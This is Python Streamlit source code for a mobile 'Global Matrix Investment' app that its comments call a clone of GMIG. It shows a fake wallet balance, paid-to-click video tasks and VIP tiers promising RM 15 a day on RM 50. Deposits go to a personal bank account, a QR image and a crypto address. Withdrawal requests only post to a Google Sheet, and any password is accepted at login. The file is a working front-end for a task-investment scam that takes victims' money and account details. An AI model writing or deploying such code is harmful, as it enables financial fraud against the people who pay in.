import streamlit as st
import time
import requests

# Page Initial Setup (Strict Mobile View Layout Only)
st.set_page_config(page_title="Global Matrix Investment", page_icon="📈", layout="centered")

# Google Sheet Connection Backend Endpoint
WEB_APP_URL = "https://script.google.com/macros/s/AKfycbw-qngxwhZhlH07e6-wROfPnOd9jLGBfavoBoVcCfPqgk_AxiUnQTLOsr3CbLficPIMwQ/exec"

# --- GMIG EXACT UI DESIGN CLONE STYLESHEET ---
st.markdown("""
    <style>
    /* Hide all junk Streamlit design elements to make it a pure app */
    header, footer, .stDeployButton, #MainMenu, [data-testid="stStatusWidget"], [data-testid="stSidebar"] { 
        display: none !important; visibility: hidden !important;
    }
    
    /* Main App Body Canvas */
    .stApp {
        background-color: #0d1117 !important;
    }
    
    .main .block-container { 
        padding-top: 15px !important; 
        padding-bottom: 90px !important; 
        max-width: 450px !important;
        margin: 0 auto;
    }
    
    /* Top Brand Navigation Header */
    .gmig-top-bar {
        background: #161b22;
        padding: 15px;
        text-align: center;
        font-weight: 800;
        font-size: 19px;
        color: #f0f6fc;
        border-bottom: 2px solid #f59e0b;
        border-radius: 0 0 15px 15px;
        margin-bottom: 15px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
    }
    
    /* Premium Dashboard Crypto Wallet Balance Card */
    .gmig-balance-card {
        background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
        padding: 22px;
        border-radius: 16px;
        border: 1px solid #30363d;
        margin-bottom: 20px;
        box-shadow: 0 6px 20px rgba(0,0,0,0.4);
    }
    
    /* Action Management Row Layout (Recharge & Withdraw Grid) */
    .action-grid-container {
        display: flex;
        justify-content: space-between;
        gap: 12px;
        margin-bottom: 25px;
    }
    
    .action-card-btn {
        flex: 1;
        background: #161b22;
        border: 1px solid #30363d;
        padding: 14px;
        border-radius: 12px;
        text-align: center;
        cursor: pointer;
        transition: all 0.2s ease;
    }
    .action-card-btn:active {
        transform: scale(0.95);
        background: #21262d;
    }
    
    /* Dedicated Content Boxes for Task & Payment Gates */
    .content-box-premium {
        background: #161b22;
        border: 1px solid #30363d;
        border-radius: 14px;
        padding: 16px;
        margin-bottom: 15px;
    }
    
    /* VIP Selection Tier Cards Configuration */
    .vip-tier-node {
        background: linear-gradient(90deg, #1f2937 0%, #161b22 100%);
        border-left: 5px solid #f59e0b;
        border-radius: 12px;
        padding: 15px;
        margin-bottom: 15px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-top: 1px solid #30363d;
        border-right: 1px solid #30363d;
        border-bottom: 1px solid #30363d;
    }
    
    .vip-node-badge {
        background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
        color: #000000;
        font-weight: 900;
        padding: 8px 14px;
        border-radius: 8px;
        font-size: 16px;
    }
    
    /* Sticky Solid App Feel Bottom Navigation Menu Dock */
    .bottom-nav-dock {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: #161b22;
        border-top: 1px solid #30363d;
        padding: 10px 0;
        display: flex;
        justify-content: space-around;
        z-index: 99999;
        max-width: 450px;
        margin: 0 auto;
    }
    
    .nav-dock-item {
        background: none;
        border: none;
        color: #8b949e;
        font-size: 12px;
        font-weight: 600;
        text-align: center;
        cursor: pointer;
    }
    .nav-dock-item.active {
        color: #f59e0b !important;
    }
    </style>
    """, unsafe_allow_html=True)

# Application Engine Session State Configurations
if 'logged_in' not in st.session_state: st.session_state.logged_in = False
if 'current_tab' not in st.session_state: st.session_state.current_tab = "Home"
if 'sub_page' not in st.session_state: st.session_state.sub_page = "Main"
if 'user_wallet' not in st.session_state: st.session_state.user_wallet = 0.00
if 'user_phone' not in st.session_state: st.session_state.user_phone = "salmanveerm@gmail.com"
if 'task_watched' not in st.session_state: st.session_state.task_watched = False

# --- 1️⃣ ENTRY CONTROL PORTAL (AUTHENTICATION SCREEN) ---
if not st.session_state.logged_in:
    st.markdown('<div class="gmig-top-bar">📈 GLOBAL MATRIX INVESTMENT<br><span style="font-size:11px; color:#8b949e; font-weight:normal;">Secure Mobile Node Gateway</span></div>', unsafe_allow_html=True)
    
    with st.container():
        st.markdown('<div class="content-box_premium" style="padding:10px;">', unsafe_allow_html=True)
        login_phone = st.text_input("📱 E-mail Address / Phone Node ID", value=st.session_state.user_phone)
        login_password = st.text_input("🔒 Security Access Password", type="password", placeholder="••••••••")
        invitation_code = st.text_input("🤝 Registration Referral Token Code", value="168943")
        
        if st.button("🚀 SECURE ENCRYPTED SIGN-IN", use_container_width=True):
            if login_phone and login_password:
                st.session_state.logged_in = True
                st.session_state.user_phone = login_phone
                st.rerun()
            else:
                st.error("Authentication credentials cannot be left empty.")
        st.markdown('</div>', unsafe_allow_html=True)

# --- 2️⃣ MAIN PREMIUM APP SHELL INTERFACE (SECURED NODES) ---
else:
    # Always display the custom top app navigation panel header
    st.markdown(f'<div class="gmig-top-bar">🌐 GMIG MALAYSIA PORTAL</div>', unsafe_allow_html=True)
    
    # ----------------- 🏠 HOME MATRIX WORKSPACE -----------------
    if st.session_state.current_tab == "Home":
        
        # NAVIGATION CONTROLLER: RECHARGE SCREEN DEPLOYMENT
        if st.session_state.sub_page == "Recharge":
            st.markdown("#### 📥 Secure Fund Accumulation Node")
            if st.button("⬅️ Return to Control Panel Dashboard", use_container_width=True):
                st.session_state.sub_page = "Main"
                st.rerun()
                
            dep_method = st.selectbox("Choose Localized Liquidity Provider Portal:", ["Touch 'n Go (TNG eWallet)", "Malaysia Local Instant Banking Cluster", "USDT Blockchain Node (TRC20 Only)"])
            
            if dep_method == "Touch 'n Go (TNG eWallet)":
                st.markdown("""
                <div class="content-box-premium">
                    <h5 style="color:#f59e0b; margin:0 0 8px 0;">📲 Official Touch 'n Go Merchant Gateway</h5>
                    <p style="font-size:13px; color:#8b949e; margin-bottom:12px;">Scan the direct secure matrix code block below using your TNG app to fulfill deployment payment:</p>
                </div>
                """, unsafe_allow_html=True)
                
                # Render payment gateway QR block using reliable layout structure
                st.markdown(
                    f'<div style="text-align:center; background:white; padding:15px; border-radius:12px; width:fit-content; margin: 0 auto 15px auto;">'
                    f'<img src="https://kommodo.ai/i/pt49bwYh6iJZi2gWV2EE" width="260" style="display:block; margin:0 auto; border-radius:6px;">'
                    f'</div>', 
                    unsafe_allow_html=True
                )
                
            elif dep_method == "Malaysia Local Instant Banking Cluster":
                st.markdown("""
                <div class="content-box-premium">
                    <h5 style="color:#f59e0b; margin:0 0 8px 0;">🏦 Automated Local Clearing Account</h5>
                    <p style="font-size:13px; color:#c9d1d9;"><b>Designated Settlement Bank:</b> Maybank Berhad / CIMB Group</p>
                    <p style="font-size:13px; color:#c9d1d9;"><b>Settlement Node Number:</b> 1140-9982-3411</p>
                    <p style="font-size:13px; color:#c9d1d9;"><b>Beneficiary Clearing Name:</b> MANI RAJPUT</p>
                </div>
                """, unsafe_allow_html=True)
                
            elif dep_method == "USDT Blockchain Node (TRC20 Only)":
                st.markdown("""
                <div class="content-box-premium">
                    <h5 style="color:#10b981; margin:0 0 8px 0;">🟢 Decentralized Crypto TRC20 Ledger</h5>
                    <p style="font-size:12px; color:#8b949e;"><b>Protocol Network Architecture:</b> TRON Token Network (TRC-20)</p>
                    <code style="display:block; padding:10px; background:#0d1117; color:#58a6ff; border-radius:6px; word-break:break-all;">TX9ManiRajputHighSecurityUSDTNodeTRC20PayloadXX789</code>
                </div>
                """, unsafe_allow_html=True)
                
            with st.form("secure_deposit_form"):
                amount = st.number_input("Input Confirmed Fiat/Crypto Units Sent:", min_value=10, value=50)
                ref_id = st.text_input("Electronic Receipt Reference Hash ID (Ref No):", placeholder="e.g. TNG881923011...")
                
                if st.form_submit_button("🔒 DISPATCH VERIFICATION SLIP TO ADMIN", use_container_width=True):
                    if ref_id:
                        try: requests.post(WEB_APP_URL, json={"action": "deposit", "phone": st.session_state.user_phone, "method": dep_method, "amount": amount, "ref": ref_id})
                        except: pass
                        st.success("✔ Verification token successfully logged! Central management audit will activate assets within 10 minutes.")
                    else:
                        st.error("Action denied: Valid Transfer Ref ID is essential.")

        # NAVIGATION CONTROLLER: WITHDRAW SCREEN DEPLOYMENT
        elif st.session_state.sub_page == "Withdraw":
            st.markdown("#### 📤 Secure Asset Liquidation Terminal")
            if st.button("⬅️ Return to Control Panel Dashboard", use_container_width=True):
                st.session_state.sub_page = "Main"
                st.rerun()
                
            with st.form("secure_withdrawal_form"):
                w_method = st.selectbox("Target Allocation Corridor:", ["Touch 'n Go eWallet Network", "Malaysian Commercial Bank Wire", "External USDT Crypto Address Wallet"])
                w_acc = st.text_input("Recipient Destination Address / Account Node Phone Target:")
                w_title = st.text_input("Beneficiary Account Name Holder Title Verification:")
                w_amount = st.number_input("Liquidation Volume Request (Minimum Limit: RM 50):", min_value=50, value=50)
                
                if st.form_submit_button("💸 AUTHORIZE IMMEDIATE PAYOUT DISPATCH", use_container_width=True):
                    if w_acc and w_title:
                        try: requests.post(WEB_APP_URL, json={"action": "withdraw", "phone": st.session_state.user_phone, "method": w_method, "account": w_acc, "title": w_title, "amount": w_amount})
                        except: pass
                        st.success("🚀 Liquidation transaction routing scheduled! Asset confirmation updates incoming.")
                    else:
                        st.error("Process aborted: Fill in target allocation structural metadata fields.")

        # DEFAULT ACTIVE STATE: CORE INTERACTIVE MOBILE HOME DASHBOARD
        else:
            st.markdown(f"""
            <div class="gmig-balance-card">
                <div style="color:#8b949e; font-size:12px; margin-bottom:4px; font-family:monospace;">System Account ID: {st.session_state.user_phone}</div>
                <div style="color:#c9d1d9; font-size:14px; font-weight:500;">Aggregated Operational Liquidity</div>
                <div style="font-size:36px; font-weight:800; color:#ffffff; margin-top:5px; letter-spacing:-1px;">RM {st.session_state.user_wallet:.2f}</div>
            </div>
            """, unsafe_allow_html=True)
            
            # Action Cluster Modules
            col_rec_btn, col_wth_btn = st.columns(2)
            with col_rec_btn:
                if st.button("📥 RECHARGE", use_container_width=True):
                    st.session_state.sub_page = "Recharge"
                    st.rerun()
            with col_wth_btn:
                if st.button("📤 WITHDRAW", use_container_width=True):
                    st.session_state.sub_page = "Withdraw"
                    st.rerun()
            
            st.markdown("---")
            st.markdown("#### 📺 Active SMM Paid-To-Click Tasks Pool")
            
            # Interactive Streamlined Task Execution Flow Container
            st.markdown("""
            <div class="content-box-premium" style="border-left: 4px solid #ef4444;">
                <span style="background:#ef4444; color:white; font-size:10px; font-weight:bold; padding:3px 8px; border-radius:4px;">VIDEO TASK PIPELINE</span>
                <h5 style="margin:10px 0 5px 0; color:#f0f6fc;">Task Sequence #881 - Monetization Link</h5>
                <p style="font-size:12px; color:#8b949e; margin-bottom:12px;">Mandatory: Stream the system target reference clip completely to activate transaction validation flags.</p>
            </div>
            """, unsafe_allow_html=True)
            
            # Secure execution framework video node injection
            st.video("https://www.youtube.com/watch?v=dQw4w9WgXcQ") 
            
            # Logic check verification sequence barrier
            st.markdown("<p style='font-size:12px; color:#f59e0b; text-align:center;'>👇 Watch the full media stream above, then trigger verification sequence below:</p>", unsafe_allow_html=True)
            
            if st.button("🔴 STEP 1: INITIALIZE TASK ENGAGEMENT VALIDATION", use_container_width=True):
                st.session_state.task_watched = True
                st.toast("Media connection verified. Verification sequence unlocked!", icon="📺")
            
            if st.session_state.task_watched:
                if st.button("💰 STEP 2: CLAIM SYSTEM TASK REWARD UNITS (RM 5.00)", use_container_width=True):
                    st.session_state.user_wallet += 5.00
                    st.session_state.task_watched = False # Reset flag pipeline
                    st.success("Transaction Complete! RM 5.00 logged into main storage core.")
                    time.sleep(1)
                    st.rerun()
            else:
                st.button("🔒 CLAIM TASK REWARD UNITS (LOCKED)", use_container_width=True, disabled=True)

    # ----------------- 📊 SYSTEM STRATEGIC INVESTMENT PROJECT CORES -----------------
    elif st.session_state.current_tab == "Project":
        st.markdown("#### 💎 Operational VIP Identity Architecture")
        st.write("Upgrade account matrix parameters to upscale resource yield quotas.")
        
        # Level Tier Package Module 1
        st.markdown("""
        <div class="vip-tier-node">
            <div class="vip-node-badge">VIP 1</div>
            <div style="flex-grow:1; margin-left:18px;">
                <span style="color:#58a6ff; font-weight:700; font-size:15px;">Daily Yield Quota: RM 15.00</span><br>
                <span style="font-size:12px; color:#8b949e;">Allocation Premium Value: RM 50.00</span><br>
                <span style="font-size:11px; color:#f59e0b;">Contract Lifecycle Term: 60 Days</span>
            </div>
        </div>
        """, unsafe_allow_html=True)
        if st.button("⚡ Provision VIP 1 Structural Matrix Node", key="p_v1", use_container_width=True):
            st.success("Strategic deployment successful! Resource parameters expanded.")

        # Level Tier Package Module 2
        st.markdown("""
        <div class="vip-tier-node">
            <div class="vip-tier-node" style="border-left-color: #c9d1d9; width:100%; margin:0; padding:0; border:none;">
                <div class="vip-node-badge" style="background: linear-gradient(135deg, #c9d1d9 0%, #8b949e 100%);">VIP 2</div>
                <div style="flex-grow:1; margin-left:18px;">
                    <span style="color:#58a6ff; font-weight:700; font-size:15px;">Daily Yield Quota: RM 60.00</span><br>
                    <span style="font-size:12px; color:#8b949e;">Allocation Premium Value: RM 200.00</span><br>
                    <span style="font-size:11px; color:#f59e0b;">Contract Lifecycle Term: 60 Days</span>
                </div>
            </div>
        </div>
        """, unsafe_allow_html=True)
        if st.button("⚡ Provision VIP 2 Structural Matrix Node", key="p_v2", use_container_width=True):
            st.success("Strategic deployment successful! Resource parameters expanded.")

    # --- NATIVE APP NAVIGATION BOTTOM STRUCT DOCK ---
    st.markdown("<br><br><br>", unsafe_allow_html=True)
    
    # Precise column splitting grid simulation for native system bottom menu selection
    col_nav1, col_nav2, col_nav3 = st.columns(3)
    with col_nav1:
        if st.button("🏠 Home System", use_container_width=True):
            st.session_state.current_tab = "Home"
            st.session_state.sub_page = "Main"
            st.rerun()
    with col_nav2:
        if st.button("📊 Project Hall", use_container_width=True):
            st.session_state.current_tab = "Project"
            st.rerun()
    with col_nav3:
        if st.button("🚪 Leave App", use_container_width=True):
            st.session_state.logged_in = False
            st.rerun()
